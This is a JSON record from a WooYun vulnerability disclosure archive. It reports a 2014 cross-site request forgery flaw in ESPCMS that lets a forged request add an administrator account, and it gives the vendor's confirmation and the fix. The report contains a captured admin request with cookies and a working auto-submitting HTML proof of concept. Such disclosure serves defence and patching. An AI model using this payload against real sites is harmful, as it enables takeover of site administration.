{"id": 53963, "wybug_id": "wooyun-2014-065964", "wybug_title": "ESPCMS通过csrf添加管理员", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "jjf012", "wybug_date": "2014-06-24 18:02", "wybug_open_date": "2014-09-22 18:04", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向公众公开  简要描述： 如题，没检验表单。 详细说明：  \nPOST /adminsoft/index.php?archive=management&action=managesava HTTP/1.1Host: 127.0.0.1Proxy-Connection: keep-aliveContent-Length: 127Accept: */*X-Requested-With: XMLHttpRequestOrigin: http://127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.1.2000 Chrome/30.0.1599.101 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip,deflateAccept-Language: zh-CNCookie: cookiecheckrlc8273f6a0177588459b1971c65829cc6=1403513838; ecisp_seccode=XXB-e31iPaRmYmdacaaZmYs; esp_powerlist=lNKj; ecisp_admininfo=ZOKYyNKh0OJwl8aZnGNqaJducJqdY8pqlshol5tyl5lryGVqbpVsbLGcl5ptlJmcxpxslZeVmWpqbptvmGiaZspoyphtlZieZd1k4mOvmptqbmjLacdnlZxvl55xZZZsyGNsbpSbbWqdZZ-ax5s; ecisp_home_seccode=WHODeH9rPaRmYmdacaeRnoY; ecisp_member_username=p8uq2JY; ecisp_member_info=ZOKzlOFp3tqepNVz2pemq5GbpqLhZZdqlJxomJpsZN1ll2VjbpNua2iYr52bmJtolsqdZ5SXnJRmb5pvb2zGZptqyJaelZtsY8Zn4mhscMmbnWmabJedx5drx51yk5lmn5Zrb5RxcGWZZZ9q; managementmangerlistpgid=0inputclass=add&tab=true&username=test1&password=123456&password2=123456&name=test1&sex=1&powergroup=1&inputclassid=1&isremote=1\n看到没token，也没看到referer的检查。   漏洞证明：  \n\n\n<html><div style=\"display:none\"><form action=\"http://127.0.0.1/adminsoft/index.php?archive=management&action=managesava\" id=\"poc\" name=\"poc\" method=\"post\"><input type=\"hidden\" name=\"inputclass\" value=\"\"/><input type=\"hidden\" name=\"tab\" value=\"\"/><input type=\"hidden\" name=\"username\" value=\"\"/><input type=\"hidden\" name=\"password\" value=\"\"/><input type=\"hidden\" name=\"password2\" value=\"\"/><input type=\"hidden\" name=\"name\" value=\"\"/><input type=\"hidden\" name=\"sex\" value=\"\"/><input type=\"hidden\" name=\"powergroup\" value=\"\"/><input type=\"hidden\" name=\"inputclassid\" value=\"\"/><input type=\"hidden\" name=\"isremote\" value=\"\"/><input type=\"submit\" name=\"up\" value\"submit\"/></form><script>var t = document.poc;t.inputclass.value=\"add\";t.tab.value=\"true\";t.username.value=\"test2\";t.password.value=\"123456\";t.password2.value=\"123456\";t.name.value=\"test1\";t.sex.value=\"1\";t.powergroup.value=\"1\";t.inputclassid.value=\"1\";t.isremote.value=\"1\";document.poc.submit();</script></div></html>\n\n\n   修复方案：  增加来源的或者token的检查吧。   版权声明：转载请注明来源 jjf012@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-06-24 19:07 厂商回复： 此漏洞已在最新版上面进行解决，感谢您的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-16 22:20 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  卧槽！ 撞洞了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}